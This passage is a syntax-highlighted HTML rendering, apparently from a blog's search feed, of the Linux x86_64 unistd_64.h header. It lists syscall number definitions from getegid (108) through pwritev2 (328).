class="meta">#<span class="keyword">define</span> __NR_getegid 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_arch_prctl 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tuxcall 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_security 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl_old 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait_old 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semtimedop 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 223</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 251</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_newfstatat 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 285</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_file_load 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 328</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_64_H */</span></span></span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
</search>
